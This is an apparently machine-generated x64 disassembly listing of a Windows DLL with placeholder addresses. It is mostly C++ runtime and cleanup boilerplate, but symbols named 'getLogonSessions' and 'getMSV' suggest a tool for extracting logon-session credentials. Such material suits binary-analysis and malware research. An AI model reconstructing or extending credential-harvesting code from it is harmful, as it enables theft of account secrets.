call j_sub_180018b3c#2
mov rcx [ rbx + 0x20 ]
call j_sub_180018b3c#2
mov rcx [ rbx + 0x28 ]
call j_sub_180018b3c#2
xor edx edx
xor ecx ecx
call sub_180019410
nop
int3
sub_18002ae00
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0xc0 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0xc0 ] 0xfffffffe
lea rcx [ rbp + 0x40 ]
call sub_1800030b0
sub_18002af60
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_180002cd0
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002afa0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_180019410
nop
int3
mov rcx [ rbx ]
call j_sub_180018b3c
sub_18002b020
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x50 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_180019410
nop
int3
mov rcx [ rbx ]
call j_sub_180018b3c
sub_18002b060
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rcx
inc rcx
call sub_180002b20
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b0a0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rcx [ rdx + 0x38 ]
jmp sub_180001f10
mov rcx [ rbx ]
call j_sub_180018b3c
sub_18002b300
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002b3b0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002b430
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002b4a0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x48 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x48 ] 0xfffffffe
mov rcx [ rbp + 0x40 ]
call sub_180001f50
sub_18002b500
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x40
mov rbp rdx
mov rcx [ rbp + 0xc0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x40
pop rbp
retn
sub_18002b590
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x40
mov rbp rdx
mov rcx [ rbp + 0xc0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x40
pop rbp
retn
sub_18002b620
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x40
mov rbp rdx
mov rcx [ rbp + 0xc0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x40
pop rbp
retn
sub_18002b6a0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002b720
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002b7b0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002b850
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002b8f0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002b990
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rcx [ rbp + 0xa0 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x30
pop rbp
retn
sub_18002ba20
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002baa0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x70 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002bb50
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x80 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002bbe0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x90 ]
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
add rdx rcx
mov eax [ rdx + 0x10 ]
or eax 0x4
cmp [ rdx + 0x48 ] 0x0
jne r-xdata
and eax 0x17
mov [ rdx + 0x10 ] eax
test [ rdx + 0x14 ] eax
jne r-xdata
or eax 0x4
xor edx edx
xor ecx ecx
call sub_180019410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002bc40
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x58 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x58 ] 0xfffffffe
mov rcx [ rbp + 0x50 ]
add rcx 0x98
call sub_180003e10
sub_18002bcc0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_180019410
nop
int3
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_18002bda0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_180019410
nop
int3
add rbx 0x20
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] 0x0
xor eax eax
mov [ rbx - 0x18 ] ax
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
sub_18002be20
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x48 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x48 ] 0xfffffffe
mov rcx [ rbp + 0x40 ]
add rcx 0x88
call sub_180003e10
sub_18002be70
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x2
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffd
lea rcx [ rbp + 0x30 ]
add rcx 0x88
call sub_180003e10
sub_18002bed0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x128 ]
call sub_180001f50
sub_18002bf00
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x168 ]
and eax 0x2
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x168 ] 0xfffffffd
lea rcx [ rbp + 0x20 ]
add rcx 0x88
call sub_180003e10
sub_18002bf70
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x168 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x168 ] 0xfffffffe
mov rcx [ rbp + 0x160 ]
call sub_180001f50
sub_18002bfa0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x120 ]
call sub_18000a420
sub_18002bfd0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x2
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffd
lea rcx [ rbp + 0x30 ]
add rcx 0x88
call sub_180003e10
sub_18002c040
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x8
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffff7
lea rcx [ rbp + 0x30 ]
add rcx 0x88
call sub_180003e10
sub_18002c190
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x48 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x48 ] 0xfffffffe
mov rcx [ rbp + 0x40 ]
add rcx 0x98
call sub_180003e10
sub_18002c1f0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
mov rcx [ rbp + 0x30 ]
call j_sub_180002330
sub_18002c340
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x2c ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x2c ] 0xfffffffe
lea rcx [ rbp + 0x80 ]
add rcx 0x88
call sub_180003e10
sub_18002c3a0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x2c ]
and eax 0x4
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x2c ] 0xfffffffb
lea rcx [ rbp + 0x170 ]
add rcx 0x88
call sub_180003e10
sub_18002c470
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffe
lea rcx [ rbp + 0x40 ]
add rcx 0x88
call sub_180003e10
sub_18002c4d0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x4
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xfffffffb
lea rcx [ rbp + 0x130 ]
add rcx 0x88
call sub_180003e10
sub_18002c530
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x20 ]
and eax 0x10
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x20 ] 0xffffffef
lea rcx [ rbp + 0x230 ]
add rcx 0x88
call sub_180003e10
sub_18002c6b0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x30 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x30 ] 0xfffffffe
lea rcx [ rbp + 0x250 ]
add rcx 0x88
call sub_180003e10
sub_18002c720
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x30 ]
and eax 0x4
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x30 ] 0xfffffffb
lea rcx [ rbp + 0x60 ]
add rcx 0x88
call sub_180003e10
sub_18002c790
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x30 ]
and eax 0x10
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x30 ] 0xffffffef
lea rcx [ rbp + 0x150 ]
add rcx 0x88
call sub_180003e10
sub_18002c8c0
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_18001775c
nop
jmp r-xdata
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax [ rbx ]
mov [ rw-data ] rax
mov rcx rbx
call sub_180017254
mov rcx rbx
call j_sub_180018b3c
lea rcx [ rsp + 0x40 ]
call sub_18001778c
add rsp 0x30
pop rbx
retn
sub_18002c92c
sub rsp 0x28
jmp r-xdata
mov rax [ rw-data ]
cmp rax 0xa
jb r-xdata
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
inc rax
mov [ rw-data ] rax
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
add rsp 0x28
retn
call rax
sub_180001000
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800185c4
j_sub_180002330
jmp sub_180002330
sub_180002d30
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180003130
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180003160
lea rax [ r--data ]
mov [ rcx ] rax
retn
sub_1800031e0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_180018b3c
sub_1800033b0
push rbx
sub rsp 0x20
movzx ebx dx
lea rdx [ rcx + 0x10 ]
movzx ecx r8w
call sub_180017cf4
test bx ax
setne al
add rsp 0x20
pop rbx
retn
sub_1800033e0
mov rax r9
mov r10 r8
mov r11 rdx
lea r9 [ rcx + 0x10 ]
mov r8 rax
mov rdx r10
mov rcx r11
jmp sub_180017d28
sub_1800034e0
movzx eax dx
lea rdx [ rcx + 0x10 ]
movzx ecx ax
jmp sub_18001780c
sub_180003540
movzx eax dx
lea rdx [ rcx + 0x10 ]
movzx ecx ax
jmp sub_18001787c
j_sub_1800185c4#2
jmp sub_1800185c4
sub_180003d20
push rbx
sub rsp 0x20
lea rbx [ rcx + 0x98 ]
mov rcx rbx
call sub_180004400
lea r11 [ r--data ]
mov rcx rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
jmp sub_180017208
sub_180003d50
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov [ rbx ] 0x0
add rsp 0x20
pop rbx
retn
call sub_180018b3c
sub_180003d80
mov rax [ rcx - 0x8 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x8 ] rax
retn
sub_180003e10
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_180017208
sub_180003e20
mov rax [ rcx - 0x10 ]
movsxd rdx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rdx + rcx - 0x10 ] rax
retn
sub_1800041c0
mov rax [ r--data ]
mov [ rdx ] rax
xor eax eax
mov [ rdx + 0x8 ] rax
mov [ rdx + 0x10 ] eax
mov rax rdx
retn
sub_1800041e0
mov rax rcx
retn
sub_1800041f0
xor eax eax
retn
sub_180004200
retn 0x0
sub_180004210
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
retn
mov rax [ rcx ]
retn
sub_180005000
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x58 ]
movsxd rax [ rax ]
retn
sub_180005020
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
xor eax eax
cdqe
retn
mov rax [ rcx + 0x60 ]
movsxd rax [ rax ]
retn
sub_180006040
push rbx
sub rsp 0x20
add rcx 0x18
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call sub_180006070
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180007270
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax [ rcx ]
movsxd rdx [ rax + 0x4 ]
test [ rdx + rcx + 0x18 ] 0x2
je r-xdata
add rsp 0x38
retn
call sub_180003da0
nop
sub_1800072a0
sub rsp 0x28
mov rdx [ rcx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_1800081e0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x20 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180008200
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x28 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180008220
movzx eax [ rcx + 0x18 ]
retn
sub_180008230
movzx eax [ rcx + 0x1a ]
retn
sub_1800088d0
push rbx
sub rsp 0x20
mov rax [ rcx ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
call [ rax + 0x18 ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180009d40
push rbx
sub rsp 0x20
lea rbx [ rcx + 0x88 ]
mov rcx rbx
call sub_18000dd20
lea r11 [ r--data ]
mov rcx rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
jmp sub_180017208
getLogonSessions
jmp getMSV
getDescription
sub rsp 0x28
lea rdx [ r--data ]
mov r8d 0x48
call sub_1800023b0
mov al 0x1
add rsp 0x28
retn
j_sub_1800185c4
jmp sub_1800185c4
sub_180016e3c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180016e60
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_180019410
int3
sub_180016e98
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180016ebc
sub rsp 0x48
mov [ rsp + 0x50 ] rcx
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_180019410
int3
sub_180016ef4
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180018a08
jmp sub_180018a08
sub_18001700c
sub rsp 0x28
call sub_180019a1c
mov ecx [ rax + 0x8 ]
mov [ rsp + 0x30 ] ecx
call sub_1800199e4
mov [ rsp + 0x34 ] eax
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180017030
mov [ rdx ] r8d
mov [ rdx + 0x8 ] rcx
mov rax rdx
retn
sub_180017074
cmp rcx [ rdx + 0x8 ]
jne r-xdata
xor eax eax
retn
cmp [ rdx ] r8d
jne r-xdata
mov eax 0x1
retn
sub_180017088
mov rax [ rcx + 0x8 ]
retn
sub_180017090
mov rax [ rcx + 0x10 ]
retn
sub_180017098
lea rax [ rw-data ]
retn
sub_1800170a0
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
test dl 0x1
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
call j_sub_180018b3c
sub_180017354
sub rsp 0x28
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_18001775c
lea rcx [ rw-data ]
call sub_1800172ec
and [ rw-data ] 0x0
lea rcx [ rsp + 0x30 ]
call sub_18001778c
add rsp 0x28
retn
sub_180017388
mov rax [ rw-data ]
retn
sub_180017390
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov rbx rcx
jne r-xdata
mov [ rw-data ] rbx
add rsp 0x20
pop rbx
retn
lea rcx [ sub_180017354 ]
mov [ rw-data ] 0x1
call sub_1800183dc
sub_180017470
sub rsp 0x28
mov rdx [ rcx + 0x28 ]
test rdx rdx
je r-xdata
add rsp 0x28
retn
xor ecx ecx
call sub_18001b19c
sub_18001778c
sub rsp 0x28
cmp [ rcx ] 0x4
jge r-xdata
add rsp 0x28
retn
movsxd rax [ rcx ]
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
call LeaveCriticalSection
sub_1800177b4
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x28
call sub_180018a08
mov rcx rax
mov [ rbx ] rax
call InitializeCriticalSection
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800177dc
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call DeleteCriticalSection
mov rcx [ rbx ]
add rsp 0x20
pop rbx
jmp j_sub_180018b3c
sub_1800177fc
mov rcx [ rcx ]
jmp EnterCriticalSection
sub_180017a80
sub rsp 0x28
lea rcx [ sub_180017a18 ]
call sub_18001a3a8
neg eax
sbb eax eax
and eax 0x18
add rsp 0x28
retn
sub_180017d58
mov [ rcx + 0x28 ] rdx
retn
sub_180017d60
lea rax [ sub_180017d58 ]
mov [ rcx + 0x8 ] rdx
mov [ rcx ] rax
mov rax rcx
retn
j_sub_18001c100
jmp sub_18001c100
sub_180017e5c
sub rsp 0x28
call sub_180018338
cvtsd2ss xmm0 xmm0
add rsp 0x28
retn
j_sub_180018338
jmp sub_180018338
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
sub_180018450
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_18001d4a0
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_180018470
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_18001848c
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_1800184fc
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_180018b3c
sub_180018598
